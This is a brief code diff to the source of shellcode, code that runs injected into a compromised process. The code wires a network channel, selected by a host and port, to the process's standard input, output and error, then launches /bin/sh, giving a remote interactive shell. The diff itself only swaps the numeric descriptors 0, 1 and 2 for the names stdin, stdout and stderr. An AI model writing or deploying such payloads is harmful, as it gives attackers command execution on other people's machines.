@@ -15,9 +15,9 @@ SHELLCODE_ENTRY {
 
 #if (HOST != UNDEFINED_HOST) || (PORT != UNDEFINED_PORT)
     struct channel chan = get_communication_channel();
-    _dup2(chan.rx, 0);
-    _dup2(chan.tx, 1);
-    _dup2(chan.tx, 2);
+    _dup2(chan.rx, stdin);
+    _dup2(chan.tx, stdout);
+    _dup2(chan.tx, stderr);
 #endif
 
     _execve("/bin/sh", argv, envp); 
